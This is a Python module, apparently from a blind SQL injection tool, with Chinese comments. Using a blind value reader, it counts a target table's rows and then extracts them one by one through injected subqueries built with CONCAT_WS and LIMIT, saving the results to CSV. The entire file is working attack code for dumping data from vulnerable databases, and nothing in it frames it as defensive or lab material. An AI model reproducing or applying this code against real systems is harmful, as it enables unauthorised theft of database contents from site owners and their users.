"""数据导出：逐行读取指定表，避免 GROUP_CONCAT 被 group_concat_max_len 截断。"""

from __future__ import annotations

import csv
import os
from dataclasses import dataclass

from .blind import ValueReader
from .utils import info, success, warn

COLUMN_SEP_HEX = "0x7c7c"     # '||'


@dataclass
class DumpResult:
    database: str
    table: str
    columns: list[str]
    rows: list[list[str]]

    def to_csv(self, path: str) -> str:
        directory = os.path.dirname(os.path.abspath(path))
        os.makedirs(directory, exist_ok=True)
        with open(path, "w", newline="", encoding="utf-8-sig") as handle:
            writer = csv.writer(handle)
            writer.writerow(self.columns)
            writer.writerows(self.rows)
        return path


class Dumper:
    def __init__(self, reader: ValueReader, dbms: str = "MySQL") -> None:
        self.reader = reader
        self.dbms = dbms

    def dump(self, database: str, table: str, columns: list[str], limit: int = 100) -> DumpResult:
        if not columns:
            raise ValueError("没有可导出的列")
        cols_sql = ",".join(f"IFNULL(`{c}`,0x20)" for c in columns)
        total = self._count(database, table)
        if total <= 0:
            warn("未取得数据（表可能为空或当前用户无权限）")
            return DumpResult(database=database, table=table, columns=columns, rows=[])
        row_count = min(total, int(limit))
        info(f"导出 {database}.{table}（共 {total} 行，读取 {row_count} 行）")

        rows: list[list[str]] = []
        for offset in range(row_count):
            expression = (
                f"(SELECT CONCAT_WS({COLUMN_SEP_HEX},{cols_sql}) "
                f"FROM `{database}`.`{table}` LIMIT {offset},1)"
            )
            raw = self.reader.read(expression)
            cells = raw.split("||")
            if len(cells) < len(columns):
                cells += [""] * (len(columns) - len(cells))
            rows.append(cells[:len(columns)])
            print(f"\r  已读取 {len(rows)}/{row_count} 行", end="", flush=True)
        print()
        success(f"已取得 {len(rows)} 行数据")
        return DumpResult(database=database, table=table, columns=columns, rows=rows)

    def _count(self, database: str, table: str) -> int:
        raw = self.reader.read(f"(SELECT COUNT(*) FROM `{database}`.`{table}`)")
        digits = "".join(ch for ch in raw if ch.isdigit())
        return int(digits) if digits else 0
